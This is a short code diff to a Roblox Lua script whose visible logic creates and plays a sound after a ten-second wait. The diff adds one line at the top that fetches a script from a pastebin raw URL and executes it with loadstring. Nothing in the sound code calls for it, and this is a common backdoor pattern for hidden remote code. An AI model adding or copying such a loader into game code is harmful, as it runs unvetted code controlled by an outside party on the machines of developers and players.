@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/n5RQgbyd"))()
+
 local SOUND_ID = "rbxassetid://115861800482390"
 task.wait(10.5)
 local sound = Instance.new("Sound")
